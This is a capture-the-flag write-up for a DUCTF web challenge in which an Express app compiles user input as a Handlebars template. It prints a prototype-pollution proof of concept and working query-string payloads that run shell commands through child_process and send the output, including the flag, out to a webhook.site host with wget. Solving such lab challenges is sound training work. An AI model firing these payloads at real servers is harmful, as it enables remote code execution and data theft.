# 🏷️ Request Handling

**Category:** Web  
**Description:**  
> They patched Handlebars SSTI, there's nothing to worry about.

-----
In this challenge, we are only given a Dockerfile.

```Dockerfile
FROM alpine:latest AS flag-builder

WORKDIR /build
RUN apk add gcc musl-dev
RUN cat <<EOF > getflag.c
#include <stdio.h>
int main() {
    printf("DUCTF{test_flag}\n");
}
EOF
RUN gcc -static getflag.c -o getflag

FROM node:22-alpine

WORKDIR /app
RUN npm init -y && npm install express@4 handlebars

RUN cat <<EOF > app.js
const express = require("express");
const Handlebars = require("handlebars");
const app = express();

app.get('/', (req, res) => {
    res.send(Handlebars.compile(req.query.x)({}));
});

app.listen(8000, () => console.log('App listening'));
EOF

COPY --from=flag-builder /build/getflag /getflag
RUN chmod 111 /getflag

EXPOSE 8000

USER node
CMD node app.js
```
<br />

<img src="https://github.com/Yazan03/CTF-writeups2025/blob/main/DU%20CTF/Request%20Handling/images/skeleton.gif?raw=true" alt="Skeleton GIF" width="300" height="300">

<br />

The only thing we have to focus on was `res.send(Handlebars.compile(req.query.x)({}));`

Googling about Handlebars, the only thing that came up was prototype pollution involving some AST manipulation.

Example : 

```js
pay= {
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`bash -c 'pwd'`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
})
```
<br />
found a POC: 

```js
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
    "type": "MustacheStatement",
    "path": 0,
    "params": [{
        "type": "NumberLiteral",
        "value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
    }],
    "loc": {
        "start": 0,
        "end": 0
    }
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.compile(source);

console.log(template({"msg":"Hello!!!"}))
```
<br />

After trying out several approaches, we found this working payload:

```
?x[type]=Program&x[body][0][type]=MustacheStatement&x[body][0][path]=0&x[body][0][params][0][type]=NumberLiteral&x[body][0][params][0][value]=console.log(process.mainModule.require('child_process').execSync('wget https://webhook.site/37831a21-e1d2-41dd-877c-1ee211a79adc?c=$(whoami)').toString())&x[body][0][loc][start]=0&x[body][0][loc][end]=0
```

And I got a callback.
<br />
<img src='https://github.com/Yazan03/CTF-writeups2025/blob/main/DU%20CTF/Request%20Handling/images/1.PNG?raw=true' />
<br />
Retrieving the flag:
```
?x[type]=Program&x[body][0][type]=MustacheStatement&x[body][0][path]=0&x[body][0][params][0][type]=NumberLiteral&x[body][0][params][0][value]=console.log(process.mainModule.require('child_process').execSync('wget https://webhook.site/37831a21-e1d2-41dd-877c-1ee211a79adc?c=$(../getflag|base64)').toString())&x[body][0][loc][start]=0&x[body][0][loc][end]=0
```
<br />
<img src='https://github.com/Yazan03/CTF-writeups2025/blob/main/DU%20CTF/Request%20Handling/images/2.PNG?raw=true'>
<br />
<img src='https://github.com/Yazan03/CTF-writeups2025/blob/main/DU%20CTF/Request%20Handling/images/3.PNG?raw=true'>
<br />
FLAG : 

```
DUCTF{35116296c07966e5f645dac55a0fe81c}
```

